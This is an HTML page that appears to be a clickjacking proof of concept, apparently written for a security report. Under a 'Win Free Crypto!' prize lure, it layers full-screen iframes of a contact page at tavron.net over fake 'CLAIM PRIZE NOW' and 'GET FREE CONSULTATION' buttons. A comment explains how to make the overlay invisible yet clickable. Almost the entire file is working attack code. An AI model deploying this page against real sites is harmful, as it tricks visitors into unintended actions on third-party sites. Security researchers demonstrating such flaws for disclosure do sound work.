<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Win Free Crypto!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f4f4f9;
            margin: 0;
            padding-top: 100px;
        }

        /* 1. The Fake Button (The Bait) */
        .fake-button {
            position: absolute;
            top: 250px; /* Adjust this to align exactly under the target button */
            left: 50%;
            transform: translateX(-50%);
            padding: 20px 40px;
            background-color: #28a745;
            color: white;
            font-size: 24px;
            font-weight: bold;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            z-index: 1; /* Stays underneath the iframe */
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        .fake-button:hover {
            background-color: #218838;
        }

        /* 2. The Target Application (The Trap) */
        .target-iframe {
            position: absolute;
            top: 0; 
            left: 0;
            width: 100vw;
            height: 100vh;
            
            /* CRITICAL: Set to 0.5 for testing alignment. 
               Set to 0.0001 for the final report to make it invisible but clickable. */
            opacity: 0.5; 
            
            z-index: 2; /* Sits directly ON TOP of the fake button */
            border: none;
        }

        /* Tavron-styled button only */
        .special-offer-button {
            position: fixed;
            bottom: 300px;
            left: 50%;
            transform: translateX(-50%);
            padding: 16px 45px;
            background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);
            color: white;
            font-size: 18px;
            font-weight: 700;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            z-index: 999;
            box-shadow: 0 6px 20px rgba(40, 167, 69, 0.4);
            transition: all 0.3s ease;
            font-family: 'Roboto', sans-serif;
            letter-spacing: 0.5px;
        }

        .special-offer-button:hover {
            background: linear-gradient(135deg, #218838 0%, #155724 100%);
            transform: translateX(-50%) translateY(-2px);
            box-shadow: 0 8px 25px rgba(40, 167, 69, 0.5);
        }

        .overlay-iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            opacity: 0.5;
            z-index: 1000;
            border: none;
            pointer-events: auto;
        }
    </style>
</head>
<body>

    <h1>🎉 You've Won a Special Prize! 🎉</h1>
    <p>Click the button below to claim it immediately.</p>

    <button class="fake-button">CLAIM PRIZE NOW</button>

    <iframe class="target-iframe" src="https://tavron.net/contact.html"></iframe>

    <!-- GET FREE CONSULTATION BUTTON ONLY (for index.html) -->
    <button class="special-offer-button" onclick="alert('Request Submitted! Our team will contact you soon.');">GET FREE CONSULTATION</button>
    <iframe class="overlay-iframe" src="https://tavron.net/contact.html"></iframe>

</body>
</html>
